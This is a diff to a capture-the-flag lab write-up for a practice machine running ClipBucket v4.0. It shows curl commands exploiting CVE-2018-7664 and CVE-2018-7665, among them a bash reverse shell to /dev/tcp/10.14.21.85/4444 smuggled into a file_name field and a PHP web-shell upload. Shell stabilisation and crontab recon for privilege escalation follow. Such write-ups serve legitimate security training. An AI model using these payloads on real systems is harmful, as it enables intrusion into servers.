@@ -334,12 +334,87 @@ According to the source it is version 4.0:
 Signup - ClipBucket v4.0
 ```
 
-File upload vuln that can be exploited in msfconsole. Just need to figure out
-how to specify the credentials.
+Looks like that version of ClipBucket might be vulnerable to a few CVE-exploits,
+including one command injection, and one arbitrary file upload, both unauthenticated.
+https://sec-consult.com/vulnerability-lab/advisory/os-command-injection-arbitrary-file-upload-sql-injection-in-clipbucket/
+
+And there is a metasploit module for one of them.
 ```
 https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/clipbucket_fileupload_exec
 ```
 
+We should be able to use either of them to get a reverse shell.
+
+### Obtaining a reverse shell
+
+#### CVE-2018-7664 (unauthenticated OS command injection)
+From https://sec-consult.com/vulnerability-lab/advisory/os-command-injection-arbitrary-file-upload-sql-injection-in-clipbucket/.
+Since it is protected by HTTP Basic Auth, we need to add the -u option and supply
+the user:pass we found earlier.
+
+Create a random jpg file 
+```
+$ echo -n -e '\xff\xd8\xff' > pfile.jpg # Create a jpeg byte header in case the server will validate the file type
+$ cat /dev/urandom | head -n100 >> pfile.jpg
+```
+We need to remove the " around Filedata=@pfile.jpg
+```
+$ curl -u developers:9972761drmfsls -F Filedata=@pfile.jpg -F "file_name=aa.php ||bash -i >& /dev/tcp/10.14.21.85/4444 0>&1" broadcast.vulnnet.thm/api/file_uploader.php
+{"success":"yes","file_name":"aa.php |bash -i >& \/dev\/tcp\/10.14.21.85\/4444 0>&1"}
+```
+
+Upload was successful, but no reverse shell on our listener.
+
+#### CVE-2018-7665
+```
+$ curl -u developers:9972761drmfsls -F file=@revshell.php -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
+creating file{"success":"yes","file_name":"1662903652ba1a0a","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
+```
+The response gives us the filename: 1662903652ba1a0a.php, but we still need to
+find out the value of CB_BEATS_UPLOAD_DIR is.
+
+By googling the metasploit module for the CVE, we find that the file is uploaded
+to http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1662903652ba1a0a.php
+
+If we navigate it we now get a shell on our listener.
+
+## Privelege escalation
+Let's start by stabilizing the shell.
+```
+$ /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")' # In the reverse shell
+Ctrl-Z
+$ stty raw -echo # On our local machine
+$ fg # To bring back nc into the foreground
+$ reset
+$ export SHELL=/bin/bash
+$ export TERM=screen-256color
+$ stty rows 74 columns 280
+```
+```
+$ id     
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Recon
+```
+www-data@vulnnet:/$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/2   * * * *   root    /var/opt/backupsrv.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+```
 
 # Questions
 1. What is the user flag?
